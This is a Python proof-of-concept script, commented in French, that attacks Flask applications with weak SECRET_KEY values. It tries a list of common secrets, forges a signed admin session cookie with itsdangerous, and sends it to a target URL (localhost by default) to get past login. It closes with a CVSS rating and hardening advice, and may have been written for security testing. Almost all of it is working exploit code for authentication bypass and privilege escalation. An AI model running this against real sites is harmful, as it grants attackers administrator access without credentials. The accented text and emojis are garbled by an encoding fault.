#!/usr/bin/env python3
"""
Exploitation de la faille SECRET_KEY faible
Permet de forger des cookies de session Flask
"""

import hashlib
import hmac
import json
import base64
import requests
from datetime import datetime
from itsdangerous import URLSafeTimedSerializer

# SECRET_KEY faible par d√©faut
WEAK_SECRET_KEY = 'your-secret-key-change-in-production'
TARGET_URL = 'http://localhost:8050'

def forge_session_cookie(user_id='1', username='admin', role='admin'):
    """
    Forge un cookie de session Flask valide
    En connaissant le SECRET_KEY, on peut cr√©er des sessions arbitraires
    """
    print(f"üé≠ Forgeage de session Flask")
    print(f"   User ID: {user_id}")
    print(f"   Username: {username}")
    print(f"   Role: {role}")
    print()
    
    # Cr√©er un serializer avec le SECRET_KEY connu
    serializer = URLSafeTimedSerializer(
        secret_key=WEAK_SECRET_KEY,
        salt='cookie-session'
    )
    
    # Donn√©es de session √† forger
    session_data = {
        '_user_id': user_id,
        'username': username,
        'role': role,
        '_fresh': True,
        '_permanent': True
    }
    
    try:
        # Signer la session
        signed_session = serializer.dumps(session_data)
        print(f"‚úÖ Session forg√©e avec succ√®s!")
        print(f"   Cookie: {signed_session[:50]}...")
        return signed_session
    except Exception as e:
        print(f"‚ùå Erreur: {e}")
        return None

def test_forged_session(session_cookie):
    """
    Tester le cookie forg√© en acc√©dant au dashboard
    """
    print(f"\nüéØ Test du cookie forg√©...")
    
    cookies = {
        'session': session_cookie
    }
    
    try:
        # Essayer d'acc√©der √† la page principale (prot√©g√©e)
        response = requests.get(
            f'{TARGET_URL}/',
            cookies=cookies,
            allow_redirects=False,
            timeout=5
        )
        
        if response.status_code == 200:
            print(f"‚úÖ ACC√àS R√âUSSI! Status: {response.status_code}")
            print(f"   Vous √™tes authentifi√© sans mot de passe!")
            return True
        elif response.status_code == 302:
            location = response.headers.get('Location', '')
            if '/login' in location:
                print(f"‚ùå √âchec: Redirection vers login")
                print(f"   Le SECRET_KEY est probablement diff√©rent")
            else:
                print(f"‚ö†Ô∏è  Redirection vers: {location}")
            return False
        else:
            print(f"‚ö†Ô∏è  Status inattendu: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"‚ùå Erreur de connexion: {e}")
        return False

def brute_force_secret_key():
    """
    Tenter de deviner le SECRET_KEY avec des valeurs communes
    """
    print("\nüîì Tentative de brute force du SECRET_KEY...")
    print()
    
    common_secrets = [
        'your-secret-key-change-in-production',
        'secret',
        'secret-key',
        'dev',
        'development',
        'production',
        'changeme',
        'password',
        '12345',
        'admin',
        'flask-secret',
        'supersecret',
        'mysecretkey',
    ]
    
    for secret in common_secrets:
        print(f"Essai: {secret:50s} ", end='')
        
        serializer = URLSafeTimedSerializer(
            secret_key=secret,
            salt='cookie-session'
        )
        
        session_data = {'_user_id': '1', 'username': 'admin'}
        signed_session = serializer.dumps(session_data)
        
        cookies = {'session': signed_session}
        
        try:
            response = requests.get(
                f'{TARGET_URL}/',
                cookies=cookies,
                allow_redirects=False,
                timeout=2
            )
            
            if response.status_code == 200:
                print("‚úÖ TROUV√â!")
                print(f"\nüî¥ SECRET_KEY d√©couvert: {secret}")
                return secret
            else:
                print("‚ùå")
        except:
            print("‚ùå")
    
    print("\n‚ö†Ô∏è  Aucun SECRET_KEY commun trouv√©")
    return None

def exploit_demo():
    """
    D√©monstration compl√®te de l'exploitation
    """
    print("="*70)
    print("üö® EXPLOITATION: Flask Session Cookie Forgery")
    print("="*70)
    print()
    print("Cette attaque permet de se connecter sans conna√Ætre le mot de passe")
    print("si le SECRET_KEY Flask est faible ou pr√©visible.")
    print()
    
    # √âtape 1: Brute force du SECRET_KEY
    secret = brute_force_secret_key()
    
    if secret:
        print()
        print(f"üéØ SECRET_KEY trouv√©: {secret}")
        print()
        
        # √âtape 2: Forger une session admin
        WEAK_SECRET_KEY = secret
        session_cookie = forge_session_cookie(
            user_id='1',
            username='admin',
            role='admin'
        )
        
        if session_cookie:
            # √âtape 3: Tester l'acc√®s
            success = test_forged_session(session_cookie)
            
            if success:
                print()
                print("="*70)
                print("üî¥ VULN√âRABILIT√â CONFIRM√âE!")
                print("="*70)
                print()
                print("Impact:")
                print("  ‚Ä¢ Authentification contourn√©e")
                print("  ‚Ä¢ Acc√®s admin sans mot de passe")
                print("  ‚Ä¢ √âl√©vation de privil√®ges possible")
                print("  ‚Ä¢ Session hijacking facile")
                print()
                print("CVSS Score: 9.1 (CRITICAL)")
                print()
    else:
        print()
        print("‚úÖ Le SECRET_KEY semble √™tre fort (non trouv√©)")
        print()
        print("Cependant, v√©rifiez que:")
        print("  1. SECRET_KEY est d√©fini dans les variables d'environnement")
        print("  2. SECRET_KEY est complexe (min 32 caract√®res al√©atoires)")
        print("  3. SECRET_KEY est diff√©rent entre dev/staging/prod")

if __name__ == '__main__':
    exploit_demo()
